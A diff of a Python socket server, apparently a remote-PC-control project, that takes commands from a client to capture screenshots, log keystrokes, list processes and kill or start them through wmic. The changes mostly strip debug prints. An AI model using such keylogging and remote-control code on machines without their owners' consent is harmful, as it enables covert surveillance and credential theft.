@@ -2,7 +2,6 @@ import socket
 import os
 import tkinter as tk
 import winreg
-import time
 from io import BytesIO
 from pynput.keyboard import Key, Listener  
 import pyautogui 
@@ -29,20 +28,15 @@ def take(sock):
     fd = BytesIO()
     img.save(fd, "png")
     data = fd.getvalue()
-    #print(data)
     sock.sendall(data)
-    print(1)
     return
 
 def takepic(sock):
     take(sock)
-    print(1)
     while (True):
         s = recvall(sock)
-        print(s)
         if (s == "TAKE"):
             take(sock)
-            print(1)
         else:
             break
     return
@@ -209,7 +203,6 @@ def printKeys(sock, keys):
     if (data == ""):
         data = "0"
     sendData(sock, data)
-    #print(data)
 
 def keylog(sock):
     keys = []
@@ -252,19 +245,15 @@ def keylog(sock):
 def process(sock):
     while (True):
         s = recvall(sock)
-        #print(s)
         if (s == "XEM"):
             process = os.popen('wmic process get Name, ProcessId, ThreadCount').read()
             sendData(sock, process)
-            #print(process)
         elif (s == "KILL"):
             test = True
             while (test):
                 s1 = recvall(sock)
-                #print(s1)
                 if (s1 == "KILLID"):
                     id = recvall(sock)
-                    #print(id)
                     if (id != ""):
                         try:
                             listID = os.popen('wmic process get ProcessId').read()
@@ -274,14 +263,11 @@ def process(sock):
                                 listID[i] = listID[i].strip()
                             if (id not in listID):
                                 sendData(sock, "0")
-                                #print("Lỗi\n")
                             else:
                                 os.system('wmic process where ProcessId=%a delete'%(id))
                                 sendData(sock, "1")
-                                #print("Đã diệt process\n")
                         except:
                             sendData(sock, "0")
-                            #print("Lỗi\n")  
                 else:
                     test = False
         elif (s == "START"):
@@ -295,10 +281,8 @@ def process(sock):
                     try:
                         os.system('wmic process call create %s'%(processName))
                         sendData(sock, "1")
-                        #print("Process đã được bật\n")
                     except:
                         sendData(sock, "0")
-                        #print("Lỗi\n")
                 else:
                     test = False
         else:
@@ -311,7 +295,6 @@ def application(sock):
         if (s == "XEM"):
             listApp = os.popen('powershell "gps | where {$_.MainWindowTitle } | select name, id, {$_.Threads.Count}').read()
             sendData(sock, listApp + '\n')
-            #print(listApp + '\n')
         elif (s == "KILL"):
             test = True
             while (test):
@@ -327,14 +310,11 @@ def application(sock):
                                 listID[i] = listID[i].strip()
                             if (id not in listID):
                                 sendData(sock, "0")
-                                #print("Lỗi\n")
                             else:
                                 os.system('wmic process where ProcessId=%a delete'%(id))
                                 sendData(sock, "1")
-                                #print("Đã diệt chương trình\n")
                         except:
                             sendData(sock, "0")  
-                            #print("Lỗi\n")
                 else:
                     test = False
         elif (s == "START"):
@@ -348,10 +328,8 @@ def application(sock):
                     try:
                         os.system('wmic process call create %s'%(appName))
                         sendData(sock, "1")
-                        #print("Chương trình đã bật\n")
                     except:
                         sendData(sock, "0")
-                        #print("Lỗi\n")
                 else:
                     test = False
         else:
@@ -365,14 +343,11 @@ def buttonServer_click():
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         s.bind((HOST, PORT))
         s.listen()
-        conn, addr = s.accept()
         try:
-            #print('Connected by', addr)
+            conn, addr = s.accept()
             str = ""
             while True:
-                #time.sleep(1)
                 str = recvall(conn)
-                #print(str)
                 if (str == "KEYLOG"):
                     keylog(conn)
                 elif (str == "REGISTRY"):
@@ -391,7 +366,7 @@ def buttonServer_click():
                     break
                 else: 
                     continue
-        except KeyboardInterrupt:
+        except socket.error:
             conn.close()
             s.close()
 
